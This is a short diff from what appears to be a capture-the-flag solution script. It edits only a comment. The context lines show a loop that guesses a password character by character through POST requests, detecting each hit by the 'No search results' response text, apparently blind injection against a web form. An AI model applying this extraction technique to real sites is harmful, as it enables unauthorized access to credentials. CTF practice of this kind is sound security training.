@@ -16,7 +16,7 @@ while '}' not in pswd:  # Discovered password is flag so we can automate the loo
         }
         r = s.post(url, data=data)
         print('trying:', pswd + pr)
-        if 'No search results' in r.text:  # Page is seems static is no problem to use a unique string relative to login page
+        if 'No search results' in r.text:  # Page is seems static so it is not a problem to use a unique string relative to login page
             pswd += pr
             print('New char found:', pr)
             print('current password prefix:', pswd)
